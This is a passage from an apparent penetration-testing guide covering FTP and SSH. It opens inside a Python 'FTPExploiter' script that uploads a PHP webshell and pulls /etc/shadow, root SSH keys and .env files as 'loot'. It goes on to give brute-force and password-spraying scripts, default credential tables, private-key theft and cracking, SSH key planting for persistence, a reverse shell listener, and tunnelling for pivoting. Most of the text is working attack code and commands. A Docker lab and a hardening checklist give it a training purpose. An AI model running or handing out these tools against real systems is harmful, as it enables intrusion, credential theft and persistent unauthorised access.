        print(f"\n{Fore.CYAN}[*] Testing Write Permissions...{Style.RESET_ALL}")
        test_content = b"FTP_WRITE_TEST"
        
        dirs_to_test = ['/', '/tmp', '/upload', '/uploads', '/pub', 
                        '/var/www/html', '/var/www', '/home', '/ftp']
        
        for d in dirs_to_test:
            try:
                self.ftp.cwd(d)
                from io import BytesIO
                self.ftp.storbinary('STOR .write_test', BytesIO(test_content))
                print(f"{Fore.GREEN}[+] WRITABLE: {d}{Style.RESET_ALL}")
                self.writable_dirs.append(d)
                # Cleanup
                try:
                    self.ftp.delete('.write_test')
                except:
                    pass
            except:
                pass
    
    def upload_webshell(self, target_dir='/var/www/html'):
        """Upload PHP webshell"""
        if not self.logged_in:
            return
        
        print(f"\n{Fore.CYAN}[*] Attempting webshell upload to {target_dir}...{Style.RESET_ALL}")
        
        webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";} ?>'
        
        try:
            self.ftp.cwd(target_dir)
            from io import BytesIO
            self.ftp.storbinary('STOR shell.php', BytesIO(webshell))
            print(f"{Fore.GREEN}[+] Webshell uploaded! Access: http://{self.target}/shell.php?cmd=id{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Upload failed: {e}{Style.RESET_ALL}")
    
    def download_sensitive(self):
        """Download all sensitive files"""
        if not self.logged_in:
            return
        
        print(f"\n{Fore.CYAN}[*] Downloading sensitive files...{Style.RESET_ALL}")
        
        sensitive_paths = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts',
            '/root/.ssh/id_rsa', '/root/.ssh/authorized_keys',
            '/root/.bash_history', '/var/www/html/.htpasswd',
            '/var/www/html/web.config', '/var/www/html/.env'
        ]
        
        os.makedirs('ftp_loot', exist_ok=True)
        
        for filepath in sensitive_paths:
            try:
                filename = filepath.replace('/', '_').lstrip('_')
                with open(f'ftp_loot/{filename}', 'wb') as f:
                    self.ftp.retrbinary(f'RETR {filepath}', f.write)
                print(f"{Fore.GREEN}[+] Downloaded: {filepath}{Style.RESET_ALL}")
            except:
                pass
    
    def run(self):
        """Run full exploitation chain"""
        self.banner_grab()
        if self.check_anonymous():
            self.enumerate_files('/')
            self.test_write()
            self.download_sensitive()
            
            if self.writable_dirs:
                print(f"\n{Fore.YELLOW}[*] Writable directories found: {self.writable_dirs}{Style.RESET_ALL}")
                for d in self.writable_dirs:
                    if 'www' in d or 'html' in d or 'htdocs' in d:
                        self.upload_webshell(d)
                        break
            
            self.ftp.quit()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [port]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21
    
    exploiter = FTPExploiter(target, port)
    exploiter.run()
```

::

---

## Post-Exploitation

::card-group
  ::card
  ---
  title: Credential Reuse
  icon: i-lucide-key
  ---
  FTP credentials often work for **SSH, SMB, web applications**, and database services. Always test discovered passwords across all open ports.
  ::

  ::card
  ---
  title: Pivot Point
  icon: i-lucide-network
  ---
  Uploaded files via FTP can serve as **pivot points** — webshells, reverse shells, SSH keys, or cron jobs for persistent access.
  ::

  ::card
  ---
  title: Data Exfiltration
  icon: i-lucide-download
  ---
  FTP is an excellent **exfiltration channel** — upload stolen data to an attacker-controlled FTP server during post-exploitation.
  ::

  ::card
  ---
  title: Lateral Movement
  icon: i-lucide-arrow-right-left
  ---
  Files found on FTP may contain **credentials for other systems**, internal documentation, network diagrams, or configuration files revealing the internal network.
  ::
::

---

## Lab Environments

### Docker Compose — Full FTP Lab

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # ================================
  # vsftpd 2.3.4 — BACKDOOR (CVE-2011-2523)
  # ================================
  vsftpd-backdoor:
    image: rickjms/vsftpd-2.3.4
    container_name: ftp-vsftpd-backdoor
    ports:
      - "21:21"
      - "6200:6200"
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.21.0.10

  # ================================
  # vsftpd Latest — Anonymous Access
  # ================================
  vsftpd-anon:
    image: fauria/vsftpd
    container_name: ftp-vsftpd-anon
    ports:
      - "2121:21"
      - "21100-21110:21100-21110"
    environment:
      - FTP_USER=admin
      - FTP_PASS=admin123
      - PASV_ADDRESS=127.0.0.1
      - PASV_MIN_PORT=21100
      - PASV_MAX_PORT=21110
    volumes:
      - ./ftp-data/anon:/home/vsftpd
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.21.0.11

  # ================================
  # ProFTPD 1.3.5 — mod_copy (CVE-2015-3306)
  # ================================
  proftpd-modcopy:
    image: hauptmedia/proftpd
    container_name: ftp-proftpd-modcopy
    ports:
      - "3121:21"
    environment:
      - FTP_USER_NAME=ftpuser
      - FTP_USER_PASS=ftppass
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.21.0.12

  # ================================
  # Pure-FTPd — Weak Credentials
  # ================================
  pure-ftpd:
    image: stilliard/pure-ftpd
    container_name: ftp-pureftpd
    ports:
      - "4121:21"
      - "30000-30009:30000-30009"
    environment:
      - FTP_USER_NAME=admin
      - FTP_USER_PASS=password
      - FTP_USER_HOME=/home/admin
      - PUBLICHOST=127.0.0.1
    volumes:
      - ./ftp-data/pure:/home/admin
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.21.0.13

  # ================================
  # Apache + PHP — Web Server (for FTP → Webshell chain)
  # ================================
  webserver:
    image: php:7.4-apache
    container_name: ftp-webserver
    ports:
      - "80:80"
    volumes:
      - ./ftp-data/anon:/var/www/html
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.21.0.14

networks:
  pentest-lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.21.0.0/24
```

::

### Quick Lab Setup

::steps{level="4"}

#### Create Data Directories & Seed Files

```bash [Terminal]
mkdir -p ftp-pentest-lab/ftp-data/{anon,pure}
cd ftp-pentest-lab

# Create seed files for enumeration practice
echo "admin:admin123" > ftp-data/anon/credentials.txt
echo "DB_HOST=10.10.10.50" > ftp-data/anon/.env
echo "<?php phpinfo(); ?>" > ftp-data/anon/info.php
mkdir -p ftp-data/anon/backup
echo "CREATE USER 'root'@'%' IDENTIFIED BY 'S3cretP@ss!';" > ftp-data/anon/backup/db_backup.sql
```

#### Start the Lab

```bash [Terminal]
docker-compose up -d
docker-compose ps
```

#### Verify All Services

```bash [Terminal]
nmap -sV -p 21,2121,3121,4121,80 localhost
```

#### Practice Attack Chain

```bash [Terminal]
# 1. Anonymous login
ftp localhost 2121

# 2. Enumerate files
ls -la

# 3. Download sensitive files
get .env
get credentials.txt
get backup/db_backup.sql

# 4. Upload webshell (FTP root = Web root)
put shell.php

# 5. Execute via web
curl "http://localhost/shell.php?cmd=id"
```

::

---

## Defensive Checks

::tip
Include these hardening recommendations in your pentest report for FTP findings.
::

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="FTP Hardening Checklist"}
  | Finding | Remediation | Priority |
  |---------|-------------|----------|
  | Anonymous login enabled | Set `anonymous_enable=NO` (vsftpd) | 🔴 Critical |
  | Writable anonymous directory | Remove write permissions or disable uploads | 🔴 Critical |
  | FTP root = Web root | Separate FTP directory from web document root | 🔴 Critical |
  | Outdated software version | Update to latest version, patch known CVEs | 🔴 Critical |
  | FTP used instead of SFTP | Migrate to SFTP (SSH-based) or FTPS (TLS) | 🔴 Critical |
  | Weak credentials | Enforce strong passwords, implement account lockout | 🟠 High |
  | No chroot jail | Enable `chroot_local_user=YES` (vsftpd) | 🟠 High |
  | Banner info disclosure | Customize banner: `ftpd_banner=Welcome` | 🟡 Medium |
  | No rate limiting | Implement connection limits per IP | 🟡 Medium |
  | `PORT` command unrestricted | Disable FTP bounce: `port_enable=NO` | 🟡 Medium |
  | No TLS encryption | Enable FTPS: `ssl_enable=YES` | 🟠 High |
  | `PASV` reveals internal IP | Configure `pasv_address` to external IP | 🟡 Medium |
  :::
::

---

## Tools Summary

::collapsible

| Tool | Purpose | Install | Key Usage |
|------|---------|---------|-----------|
| **ftp** | Built-in FTP client | Pre-installed | `ftp $IP` |
| **lftp** | Advanced FTP client | `apt install lftp` | `lftp -u user,pass $IP` |
| **wget** | Recursive download | Pre-installed | `wget -r ftp://anonymous@$IP/` |
| **curl** | FTP interaction | Pre-installed | `curl ftp://$IP/` |
| **Nmap NSE** | FTP script scanning | Built into Nmap | `nmap --script ftp-* -p 21 $IP` |
| **Hydra** | Brute force | `apt install hydra` | `hydra -L u.txt -P p.txt ftp://$IP` |
| **Medusa** | Brute force | `apt install medusa` | `medusa -h $IP -M ftp` |
| **Metasploit** | Exploit framework | Built into Kali | `use exploit/unix/ftp/vsftpd_234_backdoor` |
| **curlftpfs** | Mount FTP as filesystem | `apt install curlftpfs` | `curlftpfs user:pass@$IP /mnt` |
| **Wireshark** | Credential sniffing | `apt install wireshark` | Filter: `ftp.request.command == "PASS"` |
| **tcpdump** | Packet capture | Pre-installed | `tcpdump -A port 21` |

::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks — FTP Pentesting
  icon: i-lucide-external-link
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html
  target: _blank
  ---
  Comprehensive FTP pentesting methodology — enumeration, exploitation, and post-exploitation techniques.
  ::

  ::card
  ---
  title: HackTricks — FTP Bounce Attack
  icon: i-lucide-external-link
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.html
  target: _blank
  ---
  Detailed guide on using FTP bounce for port scanning and firewall bypass.
  ::

  ::card
  ---
  title: vsftpd 2.3.4 Backdoor Analysis
  icon: i-lucide-shield-alert
  to: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
  target: _blank
  ---
  Rapid7/Metasploit module documentation for the vsftpd backdoor exploit.
  ::

  ::card
  ---
  title: ProFTPD mod_copy CVE-2015-3306
  icon: i-lucide-shield-alert
  to: https://www.cvedetails.com/cve/CVE-2015-3306/
  target: _blank
  ---
  CVE details for the ProFTPD mod_copy unauthenticated file copy vulnerability.
  ::

  ::card
  ---
  title: FTP Commands Reference
  icon: i-lucide-file-text
  to: https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/
  target: _blank
  ---
  Complete list of FTP commands for manual server interaction.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — FTP
  icon: i-lucide-file-text
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Discovery.md
  target: _blank
  ---
  FTP enumeration payloads and techniques.
  ::

  ::card
  ---
  title: RFC 959 — FTP Protocol
  icon: i-lucide-book-open
  to: https://datatracker.ietf.org/doc/html/rfc959
  target: _blank
  ---
  The official FTP protocol specification — understand every FTP command at the protocol level.
  ::

  ::card
  ---
  title: SecLists — FTP Wordlists
  icon: i-lucide-database
  to: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
  target: _blank
  ---
  Default credential lists including FTP-specific usernames and passwords.
  ::
::

---

## Attack Flow Diagram

::steps{level="4"}

#### Discovery & Banner

```bash [Terminal]
nmap -sV -sC -p 21 $IP
nc -nv $IP 21
```
→ **Identify software + version** → `searchsploit <software>`

#### Anonymous Login Test

```bash [Terminal]
ftp $IP
# anonymous:(blank)
```
→ **Success?** → Enumerate all files, check write permissions
→ **Failed?** → Brute force credentials

#### File Enumeration

```bash [Terminal]
ftp> ls -la
ftp> ls -la /home
# Download everything
wget -r ftp://anonymous@$IP/
```
→ **Sensitive files?** → Download, analyze for credentials/keys

#### Write Permission Check

```bash [Terminal]
ftp> put test.txt
```
→ **Writable + Web root?** → Upload webshell → RCE
→ **Writable + Home dir?** → Upload SSH key → SSH access

#### CVE Exploitation

```bash [Terminal]
searchsploit vsftpd 2.3.4
searchsploit proftpd 1.3.5
```
→ **Known CVE?** → Exploit for RCE

#### Credential Reuse

```bash [Terminal]
# Test FTP creds on other services
hydra -l found_user -p found_pass ssh://$IP
crackmapexec smb $IP -u found_user -p found_pass
```

::

---
---

## Port 22 — SSH Pentesting Guide

::badge
Port 22/TCP
::
::badge
Secure Shell
::
::badge
Encrypted Remote Access
::
::badge
Key-based Authentication
::
::badge
Tunneling & Pivoting
::
::badge
Username Enumeration
::

![SSH Enumeration](https://raw.githubusercontent.com/jtesta/ssh-audit/master/screenshots/ssh-audit.png)

> **SSH (Secure Shell)** provides encrypted remote login, command execution, and file transfer. While SSH is designed to be secure, misconfigurations, weak credentials, exposed private keys, outdated versions, and vulnerable implementations create significant attack surfaces. SSH is also a critical tool for **pivoting and lateral movement** through tunneling.

::card-group
  ::card
  ---
  title: Credential Attacks
  icon: i-lucide-lock-open
  ---
  Weak passwords, default credentials, and exposed SSH keys are the most common SSH attack vectors.
  ::

  ::card
  ---
  title: Username Enumeration
  icon: i-lucide-users
  ---
  OpenSSH < 7.7 is vulnerable to **CVE-2018-15473**, allowing enumeration of valid usernames without authentication.
  ::

  ::card
  ---
  title: Key Exploitation
  icon: i-lucide-key
  ---
  Exposed private keys from FTP, SMB, web servers, or backups provide **direct authentication** without passwords.
  ::

  ::card
  ---
  title: Tunneling & Pivoting
  icon: i-lucide-network
  ---
  SSH tunneling enables **port forwarding**, **SOCKS proxying**, and **lateral movement** through compromised hosts.
  ::
::

---

## How SSH Works

### Authentication Methods

::tabs
  :::tabs-item{icon="i-lucide-lock" label="Password Authentication"}
  ```
  1. Client connects to server port 22
  2. Server presents host key (client verifies)
  3. Encrypted channel established
  4. Client sends username + password
  5. Server validates against /etc/shadow or PAM
  ```

  **Attack vector:** Brute force, password spraying, default credentials.
  :::

  :::tabs-item{icon="i-lucide-key" label="Public Key Authentication"}
  ```
  1. Client connects to server port 22
  2. Server presents host key
  3. Client presents public key
  4. Server checks ~/.ssh/authorized_keys
  5. Server sends challenge encrypted with public key
  6. Client decrypts with private key and responds
  7. Authentication successful
  ```

  **Attack vector:** Steal private key from other services (FTP, SMB, web), crack passphrase on encrypted keys.
  :::

  :::tabs-item{icon="i-lucide-fingerprint" label="Keyboard-Interactive"}
  ```
  1. Client connects to server port 22
  2. Server sends one or more prompts
  3. Client responds to each prompt
  4. Can include 2FA/MFA challenges
  ```

  **Attack vector:** Bypass MFA through session hijacking, phishing for OTP codes.
  :::

  :::tabs-item{icon="i-lucide-ticket" label="GSSAPI/Kerberos"}
  ```
  1. Client obtains Kerberos TGT
  2. Client requests service ticket for SSH server
  3. Service ticket presented to SSH server
  4. Server validates with KDC
  ```

  **Attack vector:** Kerberos ticket attacks (Pass-the-Ticket, Golden Ticket).
  :::
::

### Key SSH Files & Locations

::collapsible

| File | Location | Purpose | Pentesting Relevance |
|------|----------|---------|---------------------|
| `sshd_config` | `/etc/ssh/sshd_config` | Server configuration | Auth methods, allowed users, root login |
| `ssh_config` | `/etc/ssh/ssh_config` | Client configuration | Default connections, jump hosts |
| `authorized_keys` | `~/.ssh/authorized_keys` | Allowed public keys | Plant key for persistent access |
| `id_rsa` | `~/.ssh/id_rsa` | RSA private key | Steal for authentication |
| `id_ed25519` | `~/.ssh/id_ed25519` | Ed25519 private key | Steal for authentication |
| `id_ecdsa` | `~/.ssh/id_ecdsa` | ECDSA private key | Steal for authentication |
| `known_hosts` | `~/.ssh/known_hosts` | Known server fingerprints | Discover previously connected hosts |
| `config` | `~/.ssh/config` | User SSH config | Discover internal hosts, jump boxes |
| `ssh_host_*_key` | `/etc/ssh/` | Server host keys | Identify server, MITM detection |

::

---

## Enumeration

### Nmap Discovery

::tabs
  :::tabs-item{icon="i-lucide-scan" label="Basic Scan"}
  ```bash [Terminal]
  nmap -sV -sC -p 22 $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="SSH-Specific Scripts"}
  ```bash [Terminal]
  nmap -p 22 --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,sshv1 $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="Vulnerability Scan"}
  ```bash [Terminal]
  nmap -p 22 --script=ssh-brute,ssh-publickey-acceptance $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="Non-standard Ports"}
  ```bash [Terminal]
  nmap -sV -p- --min-rate 10000 $IP | grep -i ssh
  # Common alt ports: 2222, 22222, 8022, 830
  ```
  :::
::

### Banner Grabbing

::code-group
```bash [Netcat]
nc -nv $IP 22
# Output: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

```bash [Nmap]
nmap -p 22 --script=banner $IP
```

```bash [SSH client]
ssh -v -o PreferredAuthentications=none user@$IP 2>&1 | head -20
```
::

::tip
SSH banners reveal:
```text
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5     ← OpenSSH 8.2, Ubuntu
SSH-2.0-OpenSSH_7.4                          ← OpenSSH 7.4 (vulnerable to CVE-2018-15473)
SSH-2.0-OpenSSH_4.3                          ← Very old, many CVEs
SSH-2.0-dropbear_2019.78                     ← Dropbear SSH (embedded/IoT)
SSH-2.0-libssh_0.8.1                         ← libssh (CVE-2018-10933!)
SSH-2.0-paramiko_2.7.1                       ← Paramiko (Python SSH)
SSH-2.0-ROSSSH                               ← Mikrotik RouterOS
```
::

### ssh-audit — Comprehensive SSH Auditing

`ssh-audit` provides the **most detailed SSH security analysis** available.

```bash [Terminal]
# Install
pip3 install ssh-audit

# Run audit
ssh-audit $IP

# Output includes:
# - SSH version & banner
# - Key exchange algorithms (rated)
# - Host key algorithms (rated)
# - Encryption algorithms (rated)
# - MAC algorithms (rated)
# - Security warnings & recommendations
# - CVE identification
```

::code-collapse

```bash [ssh-audit Sample Output]
# general
(gen) banner: SSH-2.0-OpenSSH_7.4
(gen) software: OpenSSH 7.4
(gen) compatibility: OpenSSH 7.3-7.8, Dropbear SSH 2016.73+
(gen) compression: enabled (zlib@openssh.com)

# CVE Vulnerabilities
(cve) CVE-2018-15473  -- (CVSSv2: 5.3) enumerate usernames

# key exchange algorithms
(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4
(kex) diffie-hellman-group-exchange-sha256  -- [info] available since OpenSSH 4.4
(kex) diffie-hellman-group14-sha1           -- [warn] using weak hashing algorithm
(kex) diffie-hellman-group1-sha1            -- [fail] removed (in server) since OpenSSH 6.7
                                            `- [fail] disabled (in client) since OpenSSH 7.0
                                            `- [warn] using small 1024-bit modulus

# host-key algorithms
(key) ssh-rsa (2048-bit)                    -- [info] available since OpenSSH 2.5.0
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5

# encryption algorithms (ciphers)
(enc) chacha20-poly1305@openssh.com         -- [info] available since OpenSSH 6.5
(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2
(enc) aes128-cbc                            -- [warn] using weak cipher mode
(enc) 3des-cbc                              -- [fail] using broken cipher
```

::

### Authentication Method Enumeration

Discover what authentication methods the server accepts:

```bash [Terminal]
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 nonexistent@$IP 2>&1
# Output:
# Permission denied (publickey,password,keyboard-interactive).
#                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                    These are the accepted auth methods
```

::field-group
  ::field{name="publickey" type="info"}
  Server accepts public key authentication. Look for exposed private keys on FTP, SMB, web servers, or in backups.
  ::

  ::field{name="password" type="important"}
  Server accepts password authentication. Brute force and password spraying are viable.
  ::

  ::field{name="keyboard-interactive" type="medium"}
  Server uses interactive prompts — may include 2FA/MFA. Direct brute force may still work if no 2FA.
  ::

  ::field{name="gssapi-with-mic" type="info"}
  Server accepts Kerberos authentication — indicates Active Directory integration.
  ::
::

### Username Enumeration (CVE-2018-15473)

OpenSSH < 7.7 is vulnerable to **timing-based username enumeration**. The server responds differently for valid vs. invalid usernames.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python Script"}
  ```bash [Terminal]
  # Download exploit
  searchsploit -m 45233
  # OR
  git clone https://github.com/epi052/cve-2018-15473.git
  cd cve-2018-15473
  pip3 install -r requirements.txt
  
  # Enumerate single user
  python3 ssh_user_enum.py --port 22 --username root $IP
  
  # Enumerate from wordlist
  python3 ssh_user_enum.py --port 22 --userList /usr/share/seclists/Usernames/Names/names.txt $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Metasploit"}
  ```bash [Metasploit]
  use auxiliary/scanner/ssh/ssh_enumusers
  set RHOSTS $IP
  set USER_FILE /usr/share/seclists/Usernames/Names/names.txt
  set THREADS 10
  run
  ```
  :::

  :::tabs-item{icon="i-lucide-scan" label="Nmap"}
  ```bash [Nmap NSE]
  nmap -p 22 --script ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt $IP
  ```
  :::
::

::warning
CVE-2018-15473 works on OpenSSH **< 7.7**. Check the banner version first before attempting enumeration.
::

---

## Pentesting Methods

### Brute Force Attacks

::accordion
  :::accordion-item{icon="i-lucide-lock-open" label="SSH Password Brute Force"}
  ::code-group
  ```bash [Hydra]
  # Basic brute force
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -V
  
  # Single user
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
  
  # Custom port
  hydra -L users.txt -P passwords.txt ssh://$IP -s 2222 -t 4
  ```

  ```bash [Medusa]
  medusa -h $IP -U users.txt -P passwords.txt -M ssh -t 4
  ```

  ```bash [Patator]
  patator ssh_login host=$IP user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'
  ```

  ```bash [Ncrack]
  ncrack -p 22 --user admin -P /usr/share/wordlists/rockyou.txt $IP -T 4
  ```

  ```bash [Metasploit]
  use auxiliary/scanner/ssh/ssh_login
  set RHOSTS $IP
  set USER_FILE users.txt
  set PASS_FILE /usr/share/wordlists/rockyou.txt
  set THREADS 4
  set VERBOSE true
  run
  ```
  ::

  ::warning
  SSH brute forcing is **slow by design** — servers implement rate limiting, and connections are computationally expensive. Use:
  - Targeted wordlists (not full rockyou)
  - Maximum 4 threads
  - Known usernames from enumeration
  - Common/seasonal passwords (`Company2024!`, `Summer2024!`)
  ::
  :::

  :::accordion-item{icon="i-lucide-spray-can" label="Password Spraying"}
  ```bash [Hydra — Single Password, Many Users]
  hydra -L valid_users.txt -p 'Summer2024!' ssh://$IP -t 2
  hydra -L valid_users.txt -p 'Password123!' ssh://$IP -t 2
  hydra -L valid_users.txt -p 'Welcome1!' ssh://$IP -t 2
  ```

  ```bash [CrackMapExec]
  crackmapexec ssh $IP -u valid_users.txt -p 'CompanyName2024!' --continue-on-success
  ```

  ```bash [Custom Script]
  #!/bin/bash
  PASSWORDS=("Summer2024!" "Welcome1!" "Password123!" "Company2024!")
  
  for pass in "${PASSWORDS[@]}"; do
    echo "[*] Spraying: $pass"
    for user in $(cat valid_users.txt); do
      timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@$IP exit 2>/dev/null
      if [ $? -eq 0 ]; then
        echo "[+] FOUND: $user:$pass"
      fi
    done
    sleep 30  # Wait between sprays to avoid lockout
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-key" label="Default Credentials"}
  | Device/Software | Username | Password |
  |----------------|----------|----------|
  | Generic Linux | `root` | `root`, `toor`, `password` |
  | Ubuntu | `ubuntu` | `ubuntu` |
  | Raspberry Pi | `pi` | `raspberry` |
  | Kali Linux | `kali` | `kali` |
  | Cisco | `cisco` | `cisco` |
  | Mikrotik | `admin` | *(blank)* |
  | Ubiquiti | `ubnt` | `ubnt` |
  | Synology NAS | `admin` | `admin` |
  | VMware ESXi | `root` | `vmware` |
  | Oracle VM | `root` | `ovsroot` |
  | pfSense | `admin` | `pfsense` |
  | OpenWrt | `root` | *(blank)* |
  :::
::

### Private Key Exploitation

::accordion
  :::accordion-item{icon="i-lucide-key" label="Using Stolen Private Keys"}
  Private keys found on FTP, SMB, web servers, or in backups provide **direct authentication**.

  ::steps{level="5"}

  ##### Find Private Keys

  ```bash [Terminal]
  # Common locations on compromised systems
  find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null
  
  # Check web server
  curl http://$IP/.ssh/id_rsa
  curl http://$IP/backup/id_rsa
  
  # Check FTP
  ftp $IP
  ftp> cd .ssh
  ftp> get id_rsa
  
  # Check SMB
  smbclient //$IP/share
  smb: \> cd .ssh
  smb: \> get id_rsa
  ```

  ##### Set Correct Permissions

  ```bash [Terminal]
  chmod 600 id_rsa
  # SSH refuses keys with loose permissions
  ```

  ##### Identify Key Owner

  ```bash [Terminal]
  # Check which user the key belongs to
  # Look at the comment at the end of the public key
  cat id_rsa.pub
  # Output: ssh-rsa AAAA... user@hostname
  
  # Try common usernames
  for user in root admin user ubuntu www-data; do
    ssh -i id_rsa -o ConnectTimeout=3 -o BatchMode=yes $user@$IP 2>&1 | grep -v "denied"
  done
  ```

  ##### Authenticate

  ```bash [Terminal]
  ssh -i id_rsa user@$IP
  # If key is accepted → shell access!
  ```

  ::
  :::

  :::accordion-item{icon="i-lucide-lock-keyhole" label="Cracking Passphrase-Protected Keys"}
  Encrypted private keys require a passphrase. Use John the Ripper or Hashcat to crack them.

  ```bash [Identify Encrypted Key]
  head -5 id_rsa
  # -----BEGIN RSA PRIVATE KEY-----
  # Proc-Type: 4,ENCRYPTED            ← Key is passphrase-protected!
  # DEK-Info: AES-128-CBC,HEXHEXHEX
  
  # OR (newer format)
  # -----BEGIN OPENSSH PRIVATE KEY-----
  # If it contains "bcrypt", it's encrypted
  ```

  ```bash [Convert to Hash — ssh2john]
  # John the Ripper format
  ssh2john id_rsa > id_rsa.hash
  
  # OR for Python version
  python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
  ```

  ```bash [Crack with John]
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  john --show id_rsa.hash
  ```

  ```bash [Crack with Hashcat]
  # Hash mode depends on key type:
  # 22911 = RSA/DSA/EC/OpenSSH (new format, $sshng$)
  # 22921 = RSA/DSA (old format)
  
  hashcat -m 22911 id_rsa.hash /usr/share/wordlists/rockyou.txt
  ```

  ```bash [Use Cracked Key]
  ssh -i id_rsa user@$IP
  # Enter passphrase: <cracked_passphrase>
  ```
  :::

  :::accordion-item{icon="i-lucide-upload" label="Planting SSH Keys for Persistence"}
  If you have write access to a user's home directory:

  ```bash [Terminal]
  # Generate key pair
  ssh-keygen -t ed25519 -f persistence_key -N ""
  
  # Create .ssh directory on target (if needed)
  mkdir -p /home/user/.ssh
  chmod 700 /home/user/.ssh
  
  # Add your public key
  cat persistence_key.pub >> /home/user/.ssh/authorized_keys
  chmod 600 /home/user/.ssh/authorized_keys
  
  # Connect from attacker machine
  ssh -i persistence_key user@$IP
  ```
  :::
::

### SSH Tunneling & Port Forwarding

::accordion
  :::accordion-item{icon="i-lucide-arrow-right" label="Local Port Forwarding (-L)"}
  Access a remote service through an SSH tunnel — makes a **remote port accessible locally**.

  ```bash [Syntax]
  ssh -L [LOCAL_PORT]:[TARGET_HOST]:[TARGET_PORT] user@$PIVOT_IP
  ```

  ```bash [Example — Access Internal Web Server]
  # Internal web server at 10.10.10.50:80 (not directly reachable)
  # Pivot through compromised host at $IP
  ssh -L 8080:10.10.10.50:80 user@$IP
  
  # Now access internal web server at:
  curl http://localhost:8080
  ```

  ```bash [Example — Access Internal Database]
  ssh -L 3306:10.10.10.50:3306 user@$IP
  mysql -h 127.0.0.1 -u root -p
  ```

  ```bash [Example — Multiple Forwards]
  ssh -L 8080:10.10.10.50:80 -L 3306:10.10.10.50:3306 -L 445:10.10.10.60:445 user@$IP
  ```
  :::

  :::accordion-item{icon="i-lucide-arrow-left" label="Remote Port Forwarding (-R)"}
  Expose a local service to the remote network — useful for **reverse connections** and **file transfers**.

  ```bash [Syntax]
  ssh -R [REMOTE_PORT]:[LOCAL_HOST]:[LOCAL_PORT] user@$IP
  ```

  ```bash [Example — Expose Attacker's Web Server]
  # Make your local web server (8000) accessible on remote host
  ssh -R 8080:127.0.0.1:8000 user@$IP
  
  # On the remote host, wget from localhost:8080
  # to download files from your attacker machine
  ```

  ```bash [Example — Reverse Shell Listener]
  # Forward remote port 4444 to your local listener
  ssh -R 4444:127.0.0.1:4444 user@$IP
  
  # Start listener on your machine
  nc -lvnp 4444
  
  # On target, connect to localhost:4444
  # It reaches your attacker machine
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="Dynamic SOCKS Proxy (-D)"}
  Create a **SOCKS proxy** through the SSH connection — route all traffic through the compromised host.

  ```bash [Terminal]
  ssh -D 9050 user@$IP -N -f
  
  # -D 9050 = SOCKS proxy on local port 9050
  # -N = No remote command
  # -f = Background
  ```

  ```bash [Configure proxychains]
  # Edit /etc/proxychains4.conf
  # Add at the bottom:
  socks5 127.0.0.1 9050
  ```

  ```bash [Use proxychains]
  # Scan internal network through SOCKS proxy
  proxychains nmap -sT -p 80,443,445,3389 10.10.10.0/24
  
  # Access internal web services
  proxychains curl http://10.10.10.50
  
  # Use any tool through the proxy
  proxychains firefox
  proxychains crackmapexec smb 10.10.10.0/24
  ```
  :::

  :::accordion-item{icon="i-lucide-link" label="SSH Jump Host / ProxyJump"}
  Chain SSH connections through multiple hosts:

  ```bash [ProxyJump (Modern)]
  ssh -J user1@pivot1,user2@pivot2 user3@final_target
  ```

  ```bash [ProxyCommand (Legacy)]
  ssh -o ProxyCommand="ssh -W %h:%p user1@pivot1" user2@final_target
  ```

  ```bash [~/.ssh/config]
  Host pivot1
    HostName 10.10.10.25
    User admin
    IdentityFile ~/.ssh/pivot1_key
  
  Host internal-target
    HostName 10.10.20.50
    User root
    ProxyJump pivot1
    IdentityFile ~/.ssh/target_key
  
  # Usage: ssh internal-target
  ```
  :::

